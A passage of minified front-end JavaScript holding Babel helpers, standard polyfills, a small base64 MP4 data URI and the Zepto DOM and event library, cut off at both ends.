s(e,t,r){t&&B(e.prototype,t),r&&B(e,r)}function U(t,e){var r,n=Object.keys(t);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(t),e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)),n}function j(n){for(var e=1;e<arguments.length;e++){var i=null!=arguments[e]?arguments[e]:{};e%2?U(Object(i),!0).forEach((function(e){var t,r;t=n,r=i[e],e in t?Object.defineProperty(t,e,{value:r,enumerable:!0,configurable:!0,writable:!0}):t[e]=r})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(i)):U(Object(i)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(i,e))}))}return n}function c(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&V(e,t)}function a(e){return(a=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function V(e,t){return(V=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e})(e,t)}function G(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}function d(n){var i=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Date.prototype.toString.call(Reflect.construct(Date,[],(function(){}))),!0}catch(e){return!1}}();return function(){var e,t,r=a(n);return e=i?(e=a(this).constructor,Reflect.construct(r,arguments,e)):r.apply(this,arguments),r=this,!(t=e)||"object"!=typeof t&&"function"!=typeof t?G(r):t}}function K(e,t,r){return(K="undefined"!=typeof Reflect&&Reflect.get?Reflect.get:function(e,t,r){e=function(e,t){for(;!Object.prototype.hasOwnProperty.call(e,t)&&null!==(e=a(e)););return e}(e,t);if(e)return(e=Object.getOwnPropertyDescriptor(e,t)).get?e.get.call(r):e.value})(e,t,r||e)}function Y(e,t){return function(e){if(Array.isArray(e))return e}(e)||function(e,t){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(e)){var r=[],n=!0,i=!1,a=void 0;try{for(var s,o=e[Symbol.iterator]();!(n=(s=o.next()).done)&&(r.push(s.value),!t||r.length!==t);n=!0);}catch(e){i=!0,a=e}finally{try{n||null==o.return||o.return()}finally{if(i)throw a}}return r}}(e,t)||z(e,t)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function H(e){return function(e){if(Array.isArray(e))return $(e)}(e)||function(e){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(e))return Array.from(e)}(e)||z(e)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function z(e,t){var r;if(e)return"string"==typeof e?$(e,t):"Map"===(r="Object"===(r=Object.prototype.toString.call(e).slice(8,-1))&&e.constructor?e.constructor.name:r)||"Set"===r?Array.from(e):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?$(e,t):void 0}function $(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=new Array(t);r<t;r++)n[r]=e[r];return n}function W(e,t){var r,n;if("undefined"==typeof Symbol||null==e[Symbol.iterator]){if(Array.isArray(e)||(r=z(e))||t&&e&&"number"==typeof e.length)return r&&(e=r),n=0,{s:t=function(){},n:function(){return n>=e.length?{done:!0}:{done:!1,value:e[n++]}},e:function(e){throw e},f:t};throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var i,a=!0,s=!1;return{s:function(){r=e[Symbol.iterator]()},n:function(){var e=r.next();return a=e.done,e},e:function(e){s=!0,i=e},f:function(){try{a||null==r.return||r.return()}finally{if(s)throw i}}}}t.d(e,"a",(function(){return P})),t.d(e,"b",(function(){return M})),t.d(e,"c",(function(){return D})),t.d(e,"d",(function(){return x})),t.d(e,"e",(function(){return pr})),t.d(e,"f",(function(){return Zt})),Array.prototype.find||Object.defineProperty(Array.prototype,"find",{value:function(e){if(null==this)throw new TypeError('"this" is null or not defined');var t=Object(this),r=t.length>>>0;if("function"!=typeof e)throw new TypeError("predicate must be a function");for(var n=arguments[1],i=0;i<r;){var a=t[i];if(e.call(n,a,i,t))return a;i++}}}),Object.entries||(Object.entries=function(e){for(var t=Object.keys(e),r=t.length,n=new Array(r);r--;)n[r]=[t[r],e[t[r]]];return n}),Object.values||(Object.values=function(e){for(var t=Object.keys(e),r=t.length,n=new Array(r);r--;)n[r]=e[t[r]];return n}),"function"!=typeof Object.assign&&Object.defineProperty(Object,"assign",{value:function(e,t){if(null==e)throw new TypeError("Cannot convert undefined or null to object");for(var r=Object(e),n=1;n<arguments.length;n++){var i=arguments[n];if(null!=i)for(var a in i)Object.prototype.hasOwnProperty.call(i,a)&&(r[a]=i[a])}return r},writable:!0,configurable:!0}),Array.prototype.findIndex||Object.defineProperty(Array.prototype,"findIndex",{value:function(e){if(null==this)throw new TypeError('"this" is null or not defined');var t=Object(this),r=t.length>>>0;if("function"!=typeof e)throw new TypeError("predicate must be a function");for(var n=arguments[1],i=0;i<r;){var a=t[i];if(e.call(n,a,i,t))return i;i++}return-1},configurable:!0,writable:!0});var l,o,f,n,q,X,i,Z,Q,h,p,J,ee,te,re,ne,ie,ae,se,oe,le,ue,ce,de,fe,v,he,pe,g,A,ve,m,ge,Ae,me,ye,Ee,be,ke,_e,Te,Se,y,Ce,E,b,Re,we,Oe,Le,Ie,De,Pe,Ne,xe,Me,Fe,Be,Ue,k,je,Ve,Ge,Ke,Ye,He,ze={mp4:"data:video/mp4;base64,AAAAHGZ0eXBpc29tAAACAGlzb21pc28ybXA0MQAAAAhmcmVlAAAC721kYXQhEAUgpBv/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3pwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcCEQBSCkG//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADengAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAsJtb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAALwABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAB7HRyYWsAAABcdGtoZAAAAAMAAAAAAAAAAAAAAAIAAAAAAAAALwAAAAAAAAAAAAAAAQEAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACRlZHRzAAAAHGVsc3QAAAAAAAAAAQAAAC8AAAAAAAEAAAAAAWRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAAKxEAAAIAFXEAAAAAAAtaGRscgAAAAAAAAAAc291bgAAAAAAAAAAAAAAAFNvdW5kSGFuZGxlcgAAAAEPbWluZgAAABBzbWhkAAAAAAAAAAAAAAAkZGluZgAAABxkcmVmAAAAAAAAAAEAAAAMdXJsIAAAAAEAAADTc3RibAAAAGdzdHNkAAAAAAAAAAEAAABXbXA0YQAAAAAAAAABAAAAAAAAAAAAAgAQAAAAAKxEAAAAAAAzZXNkcwAAAAADgICAIgACAASAgIAUQBUAAAAAAfQAAAHz+QWAgIACEhAGgICAAQIAAAAYc3R0cwAAAAAAAAABAAAAAgAABAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAIAAAABAAAAHHN0c3oAAAAAAAAAAAAAAAIAAAFzAAABdAAAABRzdGNvAAAAAAAAAAEAAAAsAAAAYnVkdGEAAABabWV0YQAAAAAAAAAhaGRscgAAAAAAAAAAbWRpcmFwcGwAAAAAAAAAAAAAAAAtaWxzdAAAACWpdG9vAAAAHWRhdGEAAAABAAAAAExhdmY1Ni40MC4xMDE="};Z=(i=[]).concat,Q=i.filter,h=i.slice,p=window.document,J={},ee={},te={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},re=/^\s*<(\w+|!)[^>]*>/,ne=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,ie=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,ae=/^(?:body|html)$/i,se=/([A-Z])/g,oe=["val","css","html","text","data","width","height","offset"],t=p.createElement("table"),e=p.createElement("tr"),le={tr:p.createElement("tbody"),tbody:t,thead:t,tfoot:t,td:e,th:e,"*":p.createElement("div")},ue=/complete|loaded|interactive/,ce=/^[\w-]*$/,fe=(de={}).toString,v={},he=p.createElement("div"),pe={tabindex:"tabIndex",readonly:"readOnly",for:"htmlFor",class:"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},g=Array.isArray||function(e){return e instanceof Array},v.matches=function(e,t){var r,n;return!(!t||!e||1!==e.nodeType)&&((r=e.matches||e.webkitMatchesSelector||e.mozMatchesSelector||e.oMatchesSelector||e.matchesSelector)?r.call(e,t):((n=!(r=e.parentNode))&&(r=he).appendChild(e),r=~v.qsa(r,t).indexOf(e),n&&he.removeChild(e),r))},q=function(e){return e.replace(/-+(.)?/g,(function(e,t){return t?t.toUpperCase():""}))},X=function(r){return Q.call(r,(function(e,t){return r.indexOf(e)==t}))},v.fragment=function(e,t,r){var n,i,a;return(n=ne.test(e)?f(p.createElement(RegExp.$1)):n)||(e.replace&&(e=e.replace(ie,"<$1></$2>")),t===l&&(t=re.test(e)&&RegExp.$1),(a=le[t=t in le?t:"*"]).innerHTML=""+e,n=f.each(h.call(a.childNodes),(function(){a.removeChild(this)}))),Ze(r)&&(i=f(n),f.each(r,(function(e,t){-1<oe.indexOf(e)?i[e](t):i.attr(e,t)}))),n},v.Z=function(e,t){return new nt(e,t)},v.isZ=function(e){return e instanceof v.Z},v.init=function(e,t){var r,n;if(!e)return v.Z();if("string"==typeof e)if("<"==(e=e.trim())[0]&&re.test(e))r=v.fragment(e,RegExp.$1,t),e=null;else{if(t!==l)return f(t).find(e);r=v.qsa(p,e)}else{if(_(e))return f(p).ready(e);if(v.isZ(e))return e;if(g(e))n=e,r=Q.call(n,(function(e){return null!=e}));else if(Xe(e))r=[e],e=null;else if(re.test(e))r=v.fragment(e.trim(),RegExp.$1,t),e=null;else{if(t!==l)return f(t).find(e);r=v.qsa(p,e)}}return v.Z(r,e)},(f=function(e,t){return v.init(e,t)}).extend=function(t){var r,e=h.call(arguments,1);return"boolean"==typeof t&&(r=t,t=e.shift()),e.forEach((function(e){!function e(t,r,n){for(o in r)n&&(Ze(r[o])||g(r[o]))?(Ze(r[o])&&!Ze(t[o])&&(t[o]={}),g(r[o])&&!g(t[o])&&(t[o]=[]),e(t[o],r[o],n)):r[o]!==l&&(t[o]=r[o])}(t,e,r)})),t},v.qsa=function(e,t){var r,n="#"==t[0],i=!n&&"."==t[0],a=n||i?t.slice(1):t,s=ce.test(a);return e.getElementById&&s&&n?(r=e.getElementById(a))?[r]:[]:1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType?[]:h.call(s&&!n&&e.getElementsByClassName?i?e.getElementsByClassName(a):e.getElementsByTagName(t):e.querySelectorAll(t))},f.contains=p.documentElement.contains?function(e,t){return e!==t&&e.contains(t)}:function(e,t){for(;t=t&&t.parentNode;)if(t===e)return!0;return!1},f.type=$e,f.isFunction=_,f.isWindow=We,f.isArray=g,f.isPlainObject=Ze,f.isEmptyObject=function(e){for(var t in e)return!1;return!0},f.isNumeric=function(e){var t=Number(e),r=typeof e;return null!=e&&"boolean"!=r&&("string"!=r||e.length)&&!isNaN(t)&&isFinite(t)||!1},f.inArray=function(e,t,r){return i.indexOf.call(t,e,r)},f.camelCase=q,f.trim=function(e){return null==e?"":String.prototype.trim.call(e)},f.uuid=0,f.support={},f.expr={},f.noop=function(){},f.map=function(e,t){var r,n,i,a,s=[];if(Qe(e))for(n=0;n<e.length;n++)null!=(r=t(e[n],n))&&s.push(r);else for(i in e)null!=(r=t(e[i],i))&&s.push(r);return 0<(a=s).length?f.fn.concat.apply([],a):a},f.each=function(e,t){var r,n;if(Qe(e)){for(r=0;r<e.length;r++)if(!1===t.call(e[r],r,e[r]))return e}else for(n in e)if(!1===t.call(e[n],n,e[n]))return e;return e},f.grep=function(e,t){return Q.call(e,t)},window.JSON&&(f.parseJSON=JSON.parse),f.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),(function(e,t){de["[object "+t+"]"]=t.toLowerCase()})),f.fn={constructor:v.Z,length:0,forEach:i.forEach,reduce:i.reduce,push:i.push,sort:i.sort,splice:i.splice,indexOf:i.indexOf,concat:function(){for(var e,t=[],r=0;r<arguments.length;r++)t[r]=v.isZ(e=arguments[r])?e.toArray():e;return Z.apply(v.isZ(this)?this.toArray():this,t)},map:function(r){return f(f.map(this,(function(e,t){return r.call(e,t,e)})))},slice:function(){return f(h.apply(this,arguments))},ready:function(e){return ue.test(p.readyState)&&p.body?e(f):p.addEventListener("DOMContentLoaded",(function(){e(f)}),!1),this},get:function(e){return e===l?h.call(this):this[0<=e?e:e+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each((function(){null!=this.parentNode&&this.parentNode.removeChild(this)}))},each:function(r){return i.every.call(this,(function(e,t){return!1!==r.call(e,t,e)})),this},filter:function(t){return _(t)?this.not(this.not(t)):f(Q.call(this,(function(e){return v.matches(e,t)})))},add:function(e,t){return f(X(this.concat(f(e,t))))},is:function(e){return 0<this.length&&v.matches(this[0],e)},not:function(t){var r,n=[];return _(t)&&t.call!==l?this.each((function(e){t.call(this,e)||n.push(this)})):(r="string"==typeof t?this.filter(t):Qe(t)&&_(t.item)?h.call(t):f(t),this.forEach((function(e){r.indexOf(e)<0&&n.push(e)}))),f(n)},has:function(e){return this.filter((function(){return Xe(e)?f.contains(this,e):f(this).find(e).size()}))},eq:function(e){return-1===e?this.slice(e):this.slice(e,+e+1)},first:function(){var e=this[0];return e&&!Xe(e)?e:f(e)},last:function(){var e=this[this.length-1];return e&&!Xe(e)?e:f(e)},find:function(e){var r=this;return e?"object"==typeof e?f(e).filter((function(){var t=this;return i.some.call(r,(function(e){return f.contains(e,t)}))})):1==this.length?f(v.qsa(this[0],e)):this.map((function(){return v.qsa(this,e)})):f()},closest:function(r,n){var i=[],a="object"==typeof r&&f(r);return this.each((function(e,t){for(;t&&!(a?0<=a.indexOf(t):v.matches(t,r));)t=t!==n&&!qe(t)&&t.parentNode;t&&i.indexOf(t)<0&&i.push(t)})),f(i)},parents:function(e){for(var t=[],r=this;0<r.length;)r=f.map(r,(function(e){if((e=e.parentNode)&&!qe(e)&&t.indexOf(e)<0)return t.push(e),e}));return it(t,e)},parent:function(e){return it(X(this.pluck("parentNode")),e)},children:function(e){return it(this.map((function(){return rt(this)})),e)},contents:function(){return this.map((function(){return this.contentDocument||h.call(this.childNodes)}))},siblings:function(e){return it(this.map((function(e,t){return Q.call(rt(t.parentNode),(function(e){return e!==t}))})),e)},empty:function(){return this.each((function(){this.innerHTML=""}))},pluck:function(t){return f.map(this,(function(e){return e[t]}))},show:function(){return this.each((function(){var e,t,r;"none"==this.style.display&&(this.style.display=""),"none"==getComputedStyle(this,"").getPropertyValue("display")&&(this.style.display=(e=this.nodeName,J[e]||(t=p.createElement(e),p.body.appendChild(t),r=getComputedStyle(t,"").getPropertyValue("display"),t.parentNode.removeChild(t),J[e]=r="none"==r?"block":r),J[e]))}))},replaceWith:function(e){return this.before(e).remove()},wrap:function(t){var r,n,i=_(t);return this[0]&&!i&&(r=f(t).get(0),n=r.parentNode||1<this.length),this.each((function(e){f(this).wrapAll(i?t.call(this,e):n?r.cloneNode(!0):r)}))},wrapAll:function(e){if(this[0]){var t;for(f(this[0]).before(e=f(e));(t=e.children()).length;)e=t.first();f(e).append(this)}return this},wrapInner:function(n){var i=_(n);return this.each((function(e){var t=f(this),r=t.contents();e=i?n.call(this,e):n;r.length?r.wrapAll(e):t.append(e)}))},unwrap:function(){return this.parent().each((function(){f(this).replaceWith(f(this).children())})),this},clone:function(){return this.map((function(){return this.cloneNode(!0)}))},hide:function(){return this.css("display","none")},toggle:function(t){return this.each((function(){var e=f(this);(t===l?"none"==e.css("display"):t)?e.show():e.hide()}))},prev:function(e){return f(this.pluck("previousElementSibling")).filter(e||"*")},next:function(e){return f(this.pluck("nextElementSibling")).filter(e||"*")},html:function(r){return 0 in arguments?this.each((function(e){var t=this.innerHTML;f(this).empty().append(T(this,r,e,t))})):0 in this?this[0].innerHTML:null},text:function(t){return 0 in arguments?this.each((function(e){e=T(this,t,e,this.textContent),this.textContent=null==e?"":""+e})):0 in this?this.pluck("textContent").join(""):null},attr:function(t,r){var e;return"string"!=typeof t||1 in arguments?this.each((function(e){if(1===this.nodeType)if(Xe(t))for(o in t)at(this,o,t[o]);else at(this,t,T(this,r,e,this.getAttribute(t)))})):0 in this&&1==this[0].nodeType&&null!=(e=this[0].getAttribute(t))?e:l},removeAttr:function(e){return this.each((function(){1===this.nodeType&&e.split(" ").forEach((function(e){at(this,e)}),this)}))},prop:function(t,r){return t=pe[t]||t,1 in arguments?this.each((function(e){this[t]=T(this,r,e,this[t])})):this[0]&&this[0][t]},removeProp:function(e){return e=pe[e]||e,this.each((function(){delete this[e]}))},data:function(e,t){return e="data-"+e.replace(se,"-$1").toLowerCase(),null!==(t=1 in arguments?this.attr(e,t):this.attr(e))?st(t):l},val:function(t){return 0 in arguments?(null==t&&(t=""),this.each((function(e){this.value=T(this,t,e,this.value)}))):this[0]&&(this[0].multiple?f(this[0]).find("option").filter((function(){return this.selected})).pluck("value"):this[0].value)},offset:function(n){var e;return n?this.each((function(e){var t=f(this),r=(e=T(this,n,e,t.offset()),t.offsetParent().offset());e={top:e.top-r.top,left:e.left-r.left};"static"==t.css("position")&&(e.position="relative"),t.css(e)})):this.length?p.documentElement===this[0]||f.contains(p.documentElement,this[0])?{left:(e=this[0].getBoundingClientRect()).left+window.pageXOffset,top:e.top+window.pageYOffset,width:Math.round(e.width),height:Math.round(e.height)}:{top:0,left:0}:null},css:function(e,t){if(arguments.length<2){var r,n,i=this[0];if("string"==typeof e)return i?i.style[q(e)]||getComputedStyle(i,"").getPropertyValue(e):void 0;if(g(e))return i?(r={},n=getComputedStyle(i,""),f.each(e,(function(e,t){r[t]=i.style[q(t)]||n.getPropertyValue(t)})),r):void 0}var a="";if("string"==$e(e))t||0===t?a=Je(e)+":"+tt(e,t):this.each((function(){this.style.removeProperty(Je(e))}));else for(o in e)e[o]||0===e[o]?a+=Je(o)+":"+tt(o,e[o])+";":this.each((function(){this.style.removeProperty(Je(o))}));return this.each((function(){this.style.cssText+=";"+a}))},index:function(e){return e?this.indexOf(f(e)[0]):this.parent().children().indexOf(this[0])},hasClass:function(e){return!!e&&i.some.call(this,(function(e){return this.test(S(e))}),et(e))},addClass:function(r){return r?this.each((function(e){var t;"className"in this&&(n=[],t=S(this),T(this,r,e,t).split(/\s+/g).forEach((function(e){f(this).hasClass(e)||n.push(e)}),this),n.length)&&S(this,t+(t?" ":"")+n.join(" "))})):this},removeClass:function(t){return this.each((function(e){if("className"in this){if(t===l)return S(this,"");n=S(this),T(this,t,e,n).split(/\s+/g).forEach((function(e){n=n.replace(et(e)," ")})),S(this,n.trim())}}))},toggleClass:function(r,n){return r?this.each((function(e){var t=f(this);T(this,r,e,S(this)).split(/\s+/g).forEach((function(e){(n===l?!t.hasClass(e):n)?t.addClass(e):t.removeClass(e)}))})):this},scrollTop:function(e){var t;if(this.length)return t="scrollTop"in this[0],e===l?t?this[0].scrollTop:this[0].pageYOffset:this.each(t?function(){this.scrollTop=e}:function(){this.scrollTo(this.scrollX,e)})},scrollLeft:function(e){var t;if(this.length)return t="scrollLeft"in this[0],e===l?t?this[0].scrollLeft:this[0].pageXOffset:this.each(t?function(){this.scrollLeft=e}:function(){this.scrollTo(e,this.scrollY)})},position:function(){var e,t,r,n;if(this.length)return e=this[0],t=this.offsetParent(),r=this.offset(),n=ae.test(t[0].nodeName)?{top:0,left:0}:t.offset(),r.top-=parseFloat(f(e).css("margin-top"))||0,r.left-=parseFloat(f(e).css("margin-left"))||0,n.top+=parseFloat(f(t[0]).css("border-top-width"))||0,n.left+=parseFloat(f(t[0]).css("border-left-width"))||0,{top:r.top-n.top,left:r.left-n.left}},offsetParent:function(){return this.map((function(){for(var e=this.offsetParent||p.body;e&&!ae.test(e.nodeName)&&"static"==f(e).css("position");)e=e.offsetParent;return e}))}},f.fn.detach=f.fn.remove,["width","height"].forEach((function(n){var i=n.replace(/./,(function(e){return e[0].toUpperCase()}));f.fn[n]=function(t){var e,r=this[0];return t===l?We(r)?r["inner"+i]:qe(r)?r.documentElement["scroll"+i]:(e=this.offset())&&e[n]:this.each((function(e){(r=f(this)).css(n,T(this,t,e,r[n]()))}))}})),["after","prepend","before","append"].forEach((function(t,s){var o=s%2;f.fn[t]=function(){var r,n,i=f.map(arguments,(function(e){var t=[];return"array"==(r=$e(e))?(e.forEach((function(e){return e.nodeType!==l?t.push(e):f.zepto.isZ(e)?t=t.concat(e.get()):void(t=t.concat(v.fragment(e)))})),t):"object"==r||null==e?e:v.fragment(e)})),a=1<this.length;return i.length<1?this:this.each((function(e,t){n=o?t:t.parentNode,t=0==s?t.nextSibling:1==s?t.firstChild:2==s?t:null;var r=f.contains(p.documentElement,n);i.forEach((function(e){if(a)e=e.cloneNode(!0);else if(!n)return f(e).remove();n.insertBefore(e,t),r&&function e(t,r){r(t);for(var n=0,i=t.childNodes.length;n<i;n++)e(t.childNodes[n],r)}(e,(function(e){var t;null==e.nodeName||"SCRIPT"!==e.nodeName.toUpperCase()||e.type&&"text/javascript"!==e.type||e.src||(t=e.ownerDocument?e.ownerDocument.defaultView:window).eval.call(t,e.innerHTML)}))}))}))},f.fn[o?t+"To":"insert"+(s?"Before":"After")]=function(e){return f(e)[t](this),this}})),v.Z.prototype=nt.prototype=f.fn,v.uniq=X,v.deserializeValue=st,f.zepto=v,t=f;function $e(e){return null==e?String(e):de[fe.call(e)]||"object"}function _(e){return"function"==$e(e)}function We(e){return null!=e&&e==e.window}function qe(e){return null!=e&&e.nodeType==e.DOCUMENT_NODE}function Xe(e){return"object"==$e(e)}function Ze(e){return Xe(e)&&!We(e)&&Object.getPrototypeOf(e)==Object.prototype}function Qe(e){var t=!!e&&"length"in e&&e.length,r=f.type(e);return"function"!=r&&!We(e)&&("array"==r||0===t||"number"==typeof t&&0<t&&t-1 in e)}function Je(e){return e.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function et(e){return e in ee?ee[e]:ee[e]=new RegExp("(^|\\s)"+e+"(\\s|$)")}function tt(e,t){return"number"!=typeof t||te[Je(e)]?t:t+"px"}function rt(e){return"children"in e?h.call(e.children):f.map(e.childNodes,(function(e){if(1==e.nodeType)return e}))}function nt(e,t){for(var r=e?e.length:0,n=0;n<r;n++)this[n]=e[n];this.length=r,this.selector=t||""}function it(e,t){return null==t?f(e):f(e).filter(t)}function T(e,t,r,n){return _(t)?t.call(e,r,n):t}function at(e,t,r){null==r?e.removeAttribute(t):e.setAttribute(t,r)}function S(e,t){var r=e.className||"",n=r&&r.baseVal!==l;if(t===l)return n?r.baseVal:r;n?r.baseVal=t:e.className=t}function st(t){try{return t&&("true"==t||"false"!=t&&("null"==t?null:+t+""==t?+t:/^[\[\{]/.test(t)?f.parseJSON(t):t))}catch(e){return t}}function C(e,t,r,n){if(e.global)return e=t||Ae,t=r,r=n,t=A.Event(t),A(e).trigger(t,r),!t.isDefaultPrevented()}function ot(e,t){var r=t.context;if(!1===t.beforeSend.call(r,e,t)||!1===C(t,r,"ajaxBeforeSend",[e,t]))return!1;C(t,r,"ajaxSend",[e,t])}function lt(e,t,r,n){var i=r.context,a="success";r.success.call(i,e,a,t),n&&n.resolveWith(i,[e,a,t]),C(r,i,"ajaxSuccess",[t,r,e]),ct(a,t,r)}function ut(e,t,r,n,i){var a=n.context;n.error.call(a,r,t,e),i&&i.rejectWith(a,[r,t,e]),C(n,a,"ajaxError",[r,n,e||t]),ct(t,r,n)}function ct(e,t,r){var n=r.context;r.complete.call(n,t,e),C(r,n,"ajaxComplete",[t,r]),(e=r).global&&! --A.active&&C(e,null,"ajaxStop")}function R(){}function dt(e,t){return""==t?e:(e+"&"+t).replace(/[&?]{1,2}/,"?")}function ft(e,t,r,n){return A.isFunction(t)&&(n=r,r=t,t=void 0),A.isFunction(r)||(n=r,r=void 0),{url:e,data:t,success:r,dataType:n}}function ht(e){var a=[["resolve","done",y.Callbacks({once:1,memory:1}),"resolved"],["reject","fail",y.Callbacks({once:1,memory:1}),"rejected"],["notify","progress",y.Callbacks({memory:1})]],i="pending",s={state:function(){return i},always:function(){return o.done(arguments).fail(arguments),this},then:function(){var t=arguments;return ht((function(i){y.each(a,(function(e,r){var n=y.isFunction(t[e])&&t[e];o[r[1]]((function(){var e,t=n&&n.apply(this,arguments);t&&y.isFunction(t.promise)?t.promise().done(i.resolve).fail(i.reject).progress(i.notify):(e=this===s?i.promise():this,t=n?[t]:arguments,i[r[0]+"With"](e,t))}))})),t=null})).promise()},promise:function(e){return null!=e?y.extend(e,s):s}},o={};return y.each(a,(function(e,t){var r=t[2],n=t[3];s[t[1]]=r.add,n&&r.add((function(){i=n}),a[1^e][2].disable,a[2][2].lock),o[t[0]]=function(){return o[t[0]+"With"](this===o?s:this,arguments),this},o[t[0]+"With"]=r.fireWith})),s.promise(o),e&&e.call(o,o),o}function w(e){return"string"==typeof e}function pt(e){return e._zid||(e._zid=Re++)}function vt(e,t,r,n){var i,a;return(t=gt(t)).ns&&(a=t.ns,i=new RegExp("(?:^| )"+a.replace(" "," .* ?")+"(?: |$)")),(Le[pt(e)]||[]).filter((function(e){return e&&(!t.e||e.e==t.e)&&(!t.ns||i.test(e.ns))&&(!r||pt(e.fn)===pt(r))&&(!n||e.sel==n)}))}function gt(e){return{e:(e=(""+e).split("."))[0],ns:e.slice(1).sort().join(" ")}}function At(e,t){return e.del&&!De&&e.e in Pe||!!t}function mt(e){return Ne[e]||De&&Pe[e]||e}function yt(n,e,i,a,s,o,l){var t=pt(n),u=Le[t]||(Le[t]=[]);e.split(/\s/).forEach((function(e){if("ready"==e)return E(document).ready(i);var t=gt(e),r=(t.fn=i,t.sel=s,t.e in Ne&&(i=function(e){if(!(e=e.relatedTarget)||e!==this&&!E.contains(this,e))return t.fn.apply(this,arguments)}),(t.del=o)||i);t.proxy=function(e){var t;if(!(e=bt(e)).isImmediatePropagationStopped())return e.data=a,!1===(t=r.apply(n,e._args==b?[e]:[e].concat(e._args)))&&(e.preventDefault(),e.stopPropagation()),t},t.i=u.length,u.push(t),"addEventListener"in n&&n.addEventListener(mt(t.e),t.proxy,At(t,l))}))}function Et(t,e,r,n,i){var a=pt(t);(e||"").split(/\s/).forEach((function(e){vt(t,e,r,n).forEach((function(e){delete Le[a][e.i],"removeEventListener"in t&&t.removeEventListener(mt(e.e),e.proxy,At(e,i))}))}))}function bt(n,i){return(i||!n.isDefaultPrevented)&&(i=i||n,E.each(Be,(function(e,t){var r=i[e];n[e]=function(){return this[t]=xe,r&&r.apply(i,arguments)},n[t]=Me})),n.timeStamp||(n.timeStamp=Date.now()),i.defaultPrevented!==b?i.defaultPrevented:"returnValue"in i?!1===i.returnValue:i.getPreventDefault&&i.getPreventDefault())&&(n.isDefaultPrevented=xe),n}function kt(e){var t,r={originalEvent:e};for(t in e)Fe.test(t)||e[t]===b||(r[t]=e[t]);return bt(r,e)}window.Zepto=t,void 0===window.$&&(window.$=t),A=t,ge=+new 